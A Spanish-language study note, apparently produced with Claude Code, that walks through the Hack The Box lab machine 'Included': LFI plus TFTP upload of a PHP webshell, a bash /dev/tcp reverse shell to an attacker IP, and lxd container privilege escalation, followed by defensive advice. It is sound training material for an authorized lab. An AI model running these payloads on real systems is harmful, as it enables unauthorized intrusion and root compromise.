---
title: Included (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, lfi, tftp, lxd, php, linux, privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [Included HTB, HTB Included, LFI TFTP webshell, lxd privesc]
---

# Included — HTB Starting Point (Tier 2)

**Tier 2 · SO: Linux · Dificultad: Very Easy · Skills: LFI, TFTP upload, PHP webshell, lxd privilege escalation**

> Hack The Box es un laboratorio de pentesting legal y autorizado; toda actividad aquí descrita está dentro de su entorno controlado.

Included encadena dos vulnerabilidades sencillas pero muy representativas: un **Local File Inclusion** en la web y un servicio **TFTP** expuesto que permite subir archivos sin autenticación. El resultado es RCE sin credenciales. La escalada explota la membresía al grupo `lxd`, un patrón clásico en máquinas Linux con contenedores.

---

## Objetivo

Conseguir ejecución remota de código a través de LFI + TFTP y escalar privilegios abusando del grupo `lxd` para leer `/root/root.txt`.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: escaneo de puertos TCP y UDP.**

El punto crítico aquí es escanear también UDP; TFTP (puerto 69/UDP) no aparece en un escaneo TCP estándar.

```bash
# TCP — descubrir servicios web
nmap -sV -sC -p- <IP>

# UDP — imprescindible para encontrar TFTP
sudo nmap -sU -p 69 <IP>
```

Resultado esperado:
- **80/tcp** — Apache HTTP Server (aplicación PHP)
- **69/udp** — TFTP (Trivial File Transfer Protocol)

Sin el escaneo UDP, el vector de ataque principal queda invisible.

---

## Enumeración

**Categoría: análisis de la aplicación web y del servicio TFTP.**

Navegar a `http://<IP>/` muestra un formulario o página que acepta un parámetro `?file=` en la URL. Probar inclusión directa de archivos del sistema:

```bash
curl "http://<IP>/?file=/etc/passwd"
```

Si devuelve el contenido de `/etc/passwd`, el LFI está confirmado. El parámetro no sanitiza la ruta: incluye cualquier archivo legible por el proceso web (`www-data`).

Paralelamente, verificar que TFTP acepta escritura anónima:

```bash
tftp <IP>
tftp> status      # confirmar conexión
tftp> quit
```

TFTP por defecto no requiere autenticación y, en configuraciones inseguras, tiene su directorio raíz en `/var/lib/tftpboot/`, accesible por el servidor web.

---

## Acceso inicial (foothold)

**Categoría: LFI → RCE mediante webshell subida por TFTP.**

El patrón es: *subir un archivo ejecutable al servidor a través de un canal sin autenticación y luego incluirlo mediante LFI para obtener ejecución*.

**Paso 1 — Crear la webshell PHP:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Paso 2 — Subir la webshell vía TFTP:**

```bash
tftp <IP>
tftp> put shell.php
tftp> quit
```

El archivo queda en `/var/lib/tftpboot/shell.php` en el servidor.

**Paso 3 — Incluir la webshell mediante LFI:**

```bash
curl "http://<IP>/?file=/var/lib/tftpboot/shell.php&cmd=id"
```

Si responde `uid=33(www-data)`, hay RCE.

**Paso 4 — Obtener reverse shell:**

En el atacante, abrir un listener:

```bash
nc -lvnp 4444
```

Lanzar la reverse shell (ajustar el payload según el sistema; este es un ejemplo con bash URL-encoded):

```bash
curl "http://<IP>/?file=/var/lib/tftpboot/shell.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<TU_IP>/4444+0>%261'"
```

> Nota: el payload exacto puede variar. Si bash no funciona directamente, probar con `python3 -c 'import socket,subprocess,os;...'` u otras variantes. Verificar el carácter de redirección en el contexto del servidor en vivo.

Resultado: shell interactiva como `www-data`.

**Paso 5 — Enumerar credenciales del usuario mike:**

Dentro de la shell, revisar archivos de configuración de la aplicación web:

```bash
cat /var/www/html/.htpasswd    # o el archivo de config que use la app
grep -r "password\|mike" /var/www/html/
```

Las credenciales de `mike` suelen estar en un archivo de configuración o `.htpasswd` del directorio web. Usar esas credenciales para cambiar de usuario:

```bash
su mike
# introducir la contraseña encontrada
```

---

## Escalada de privilegios

**Categoría: abuso del grupo `lxd` para escape de contenedor y lectura del sistema host.**

`lxd` es el daemon de contenedores LXC. Pertenecer a este grupo equivale a tener acceso root indirecto: se puede lanzar un contenedor privilegiado que monte el sistema de archivos del host.

**Verificar la membresía:**

```bash
id
# uid=1000(mike) gid=1000(mike) grupos=1000(mike),116(lxd)
```

**El patrón de ataque `lxd`:**

1. Descargar (o construir) una imagen LXC mínima en el atacante.
2. Importarla en el servidor.
3. Crear un contenedor con `security.privileged=true` y montar `/` del host.
4. Acceder al sistema de archivos del host desde dentro del contenedor como root.

```bash
# En el atacante: descargar imagen alpine para lxd
# (buscar "lxd-alpine-builder" en GitHub o usar distrobuilder)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine
# Genera un archivo .tar.gz

# Transferir la imagen al servidor (via HTTP, nc, etc.)
python3 -m http.server 8000   # en el atacante
wget http://<TU_IP>:8000/alpine-v3.x-x86_64-<fecha>.tar.gz   # en mike@included
```

```bash
# En el servidor como mike:
lxc image import ./alpine-v3.x-x86_64-<fecha>.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Dentro del contenedor, el host completo está montado en `/mnt/root`:

```bash
cat /mnt/root/root/root.txt
```

> Ajustar los nombres de imagen y contenedor según lo que genere el builder en vivo. La técnica es estable; los nombres de archivo varían.

---

## Flags

| Flag | Ubicación en el host | Cómo acceder |
|---|---|---|
| `user.txt` | `/home/mike/user.txt` | Como usuario `mike` tras su y enumeración |
| `root.txt` | `/root/root.txt` | Desde el contenedor LXC en `/mnt/root/root/root.txt` |

```bash
# user flag
cat /home/mike/user.txt   # → <flag>

# root flag (desde dentro del contenedor lxd)
cat /mnt/root/root/root.txt   # → <flag>
```

---

## Patron y teoria

### 1. LFI + canal de escritura lateral → RCE

**Schema:** *Local File Inclusion* es una vulnerabilidad de inclusión de archivos donde el servidor ejecuta (no solo devuelve) el contenido del archivo incluido si es código interpretable. Sola, LFI permite leer archivos del sistema. Combinada con cualquier canal que permita escribir un archivo en el servidor (TFTP, FTP anónimo, upload form, /proc/self/fd...), se convierte en RCE.

**Patron general:**
```
canal de escritura sin auth  →  archivo PHP en ruta conocida
LFI  →  incluye ese archivo  →  ejecuta como www-data
```

TFTP es especialmente peligroso porque es trivial, no tiene autenticación por diseño, y corre en UDP (frecuentemente ignorado en escaneos rápidos).

**Como se defiende (dev / purple team):**
- **Whitelist de includes:** nunca construir rutas de inclusión desde input del usuario. Si hay que hacerlo, usar una whitelist explícita de nombres de archivo permitidos — nunca rutas completas.
- **Deshabilitar TFTP** si no es estrictamente necesario. Si se necesita (PXE boot, etc.), restringir a IPs específicas con firewall y directorio de solo lectura.
- **Separar el directorio TFTP** del directorio web: `/var/lib/tftpboot` no debe ser alcanzable por el servidor Apache ni por `open_basedir`.
- **`open_basedir` en PHP:** restringir el intérprete al directorio de la aplicación.
- **WAF / detección:** monitorizar parámetros que contengan rutas (`../`, `/etc/`, `/var/`) como señal de LFI.

### 2. Grupo `lxd`/`docker` como privesc

**Schema:** en Linux, pertenecer al grupo `lxd` o `docker` equivale funcionalmente a ser root. Ambos daemons pueden lanzar contenedores privilegiados con acceso al sistema de archivos del host.

**Patron general:**
```
usuario en grupo lxd/docker  →  contenedor privilegiado con / del host montado
→  lectura/escritura de cualquier archivo del sistema  →  root efectivo
```

Este patrón aparece en decenas de máquinas HTB y en entornos reales mal configurados (desarrolladores con acceso a Docker en servidores de producción).

**Como se defiende:**
- **Principio de mínimo privilegio:** no añadir usuarios al grupo `lxd` o `docker` salvo necesidad real. Preferir `rootless` Docker/Podman.
- **Auditar grupos regularmente:** `grep -E 'lxd|docker' /etc/group` como parte del hardening periódico.
- **Políticas de AppArmor/SELinux** para contenedores: impiden montar el sistema de archivos del host aunque el contenedor sea privilegiado.
- **Usar Podman** (rootless por defecto) en lugar de Docker donde sea posible.
- Referencia: [[06-seguridad-de-sistemas-y-hardening]]

### Cadena completa resumida

```
Recon UDP (nmap -sU)  →  descubrir TFTP 69/udp
TFTP put shell.php    →  archivo en /var/lib/tftpboot/
LFI ?file=            →  include + ejecución PHP → RCE como www-data
Enum credenciales     →  su mike
id → grupo lxd        →  contenedor privilegiado monta /
cat /mnt/root/root/root.txt → flag root
```

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[06-seguridad-de-sistemas-y-hardening]]
